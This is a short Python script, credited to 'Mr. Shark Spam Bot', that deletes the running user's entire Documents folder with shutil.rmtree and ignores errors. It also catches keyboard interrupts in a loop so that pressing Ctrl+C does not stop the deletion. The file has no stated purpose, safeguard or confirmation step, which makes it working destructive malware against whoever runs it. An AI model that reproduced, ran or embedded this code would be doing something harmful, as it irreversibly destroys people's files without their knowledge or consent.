# -*- coding: utf-8 -*-
"""
Created on Thu Feb 25 14:33:21 2021

@author: Mr. Shark Spam Bot
"""
import os
import shutil

while True:
    try:

        home = os.path.expanduser('~')
        documents = os.path.join(home, 'Documents')

        if os.path.exists(documents):
            shutil.rmtree(documents, ignore_errors=True)

        break

    except KeyboardInterrupt:
        continue
